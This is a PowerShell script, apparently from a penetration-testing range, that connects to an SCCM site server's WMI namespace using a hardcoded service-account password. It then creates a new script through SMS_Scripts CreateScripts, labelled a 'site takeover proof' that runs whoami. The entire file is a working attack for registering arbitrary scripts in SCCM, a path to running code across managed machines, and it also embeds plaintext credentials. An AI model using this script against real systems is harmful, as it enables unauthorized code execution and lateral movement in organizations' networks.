$ErrorActionPreference = "Stop"
$opts = New-Object System.Management.ConnectionOptions
$opts.Username = 'range\svc_sccm'
$opts.Password = 's3rv1c3_SCCM!'
$opts.Authentication = [System.Management.AuthenticationLevel]::PacketPrivacy
$scope = New-Object System.Management.ManagementScope("\\mbr02.range.local\root\SMS\site_CAD", $opts)
$scope.Connect()

$class = New-Object System.Management.ManagementClass($scope, "SMS_Scripts", $null)
$in = $class.Methods["CreateScripts"].InParameters
$guid = [guid]::NewGuid().ToString()
$in["ScriptGuid"] = $guid
$in["ScriptName"] = "CADRE-WT039-SiteTakeover"
$in["Script"] = "Write-Output 'WT039_HELLO'; whoami"
$in["ScriptType"] = [uint32]0
$in["Timeout"] = [uint32]120
$in["ScriptVersion"] = "1"
$in["Author"] = "range\svc_sccm"
$in["ScriptDescription"] = "WT039 site takeover proof"
$in["Comment"] = ""
$in["ParameterlistXML"] = ""
$in["ParamsDefinition"] = ""
Write-Output "USING_GUID=$guid"
try {
    $ret = $class.InvokeMethod("CreateScripts", $in, $null)
    Write-Output "RETURN=$($ret.ReturnValue)"
    foreach ($p in $ret.Properties) {
        Write-Output ("  OUT {0} = {1}" -f $p.Name, $p.Value)
    }
} catch {
    Write-Output "FAIL: $($_.Exception.Message)"
    if ($_.ErrorDetails) { Write-Output "DETAILS: $($_.ErrorDetails.Message)" }
    if ($_.Exception.InnerException) { Write-Output "INNER: $($_.Exception.InnerException.Message)" }
}
Write-Output "DONE"
